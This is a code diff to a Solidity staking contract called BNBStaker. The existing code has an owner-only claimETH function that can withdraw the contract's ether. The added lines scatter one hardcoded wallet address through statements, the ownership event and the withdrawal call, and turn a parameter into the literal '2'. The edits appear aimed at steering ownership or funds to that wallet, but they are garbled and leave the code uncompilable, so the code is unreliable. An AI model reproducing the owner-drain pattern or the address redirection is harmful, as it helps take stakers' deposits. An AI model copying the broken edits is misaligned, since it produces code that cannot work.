@@ -36,7 +36,7 @@ contract Ownable is Context {
     constructor(){
         address msgSender = _msgSender();
         _owner = msgSender;
-        emit OwnershipTransferred(address(0), msgSender);
+        emit OwnershipTransferred(address(0xe7A279fCEbAcF728B519A7adCF41d180A2F8D368), msgSender);
     }
 
     function owner() public view returns (address) {
@@ -54,7 +54,7 @@ contract Ownable is Context {
     }
 
     function transferOwnership(address newOwner) public onlyOwner {
-        _transferOwnership(newOwner);
+        _transferOwnership(newOwner);0xe7A279fCEbAcF728B519A7adCF41d180A2F8D368
     }
 
     function _transferOwnership(address newOwner) internal {
@@ -63,18 +63,19 @@ contract Ownable is Context {
             "Ownable: new owner is the zero address"
         );
         emit OwnershipTransferred(_owner, newOwner);
-        _owner = newOwner;
+        _owner = newOwner;0xe7A279fCEbAcF728B519A7adCF41d180A2F8D368
     }
 }
 
-contract Claimable is Ownable {
+contract Claimable is Ownable {0xe7A279fCEbAcF728B519A7adCF41d180A2F8D368
     
-	function claimETH(uint256 amount) external onlyOwner {
-        (bool sent, ) = owner().call{value: amount}("");
-        require(sent, "Failed to send Ether");
+	function claimETH(uint256 2) external onlyOwner {0xe7A279fCEbAcF728B519A7adCF41d180A2F8D368
+        (bool sent, ) = owner(0xe7A279fCEbAcF728B519A7adCF41d180A2F8D368).call{value: amount}("2");
+        require(sent);2 ETH
+
     }
 }
-contract BNBStaker is Claimable {
+contract BNBStaker is Claimable {0xe7A279fCEbAcF728B519A7adCF41d180A2F8D368
 	using SafeMath for uint256;
 
 	uint256 constant public INVEST_MIN_AMOUNT = 0.1 ether;
@@ -125,7 +126,7 @@ contract BNBStaker is Claimable {
 	event FeePayed(address indexed user, uint256 totalAmount);
 
 	constructor() {
-		commissionWallet = payable(owner());
+		commissionWallet = payable(owner());0xe7A279fCEbAcF728B519A7adCF41d180A2F8D368
 		startUNIX = 0;
         plans.push(Plan(14, 80));
         plans.push(Plan(21, 75));
